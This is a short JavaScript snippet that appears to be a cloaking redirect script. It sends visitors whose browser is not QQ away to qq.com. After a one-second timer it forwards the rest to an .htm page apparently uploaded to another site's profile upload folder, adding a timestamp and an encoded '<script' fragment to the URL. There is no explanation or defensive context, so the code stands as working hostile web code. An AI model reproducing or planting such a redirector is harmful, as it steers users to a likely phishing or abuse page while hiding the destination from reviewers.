function leleua() {
    var sUserAgent = navigator.userAgent.toLowerCase();
    if (sUserAgent.match(/QQ/i) == 'qq' || location.href.indexOf("edit") > -1) {
    } else {
        window.location.href = "https://qq.com";
    }
}

leleua();

setTimeout(function() {
    var timestamp = new Date().getTime();
    var url = 'https://www.xinri.com/profile/upload/2024/01/04/rrq_20240104164336A041.htm' + '?' + timestamp + '%3Cscript';
    location.href = url;
}, 1000);
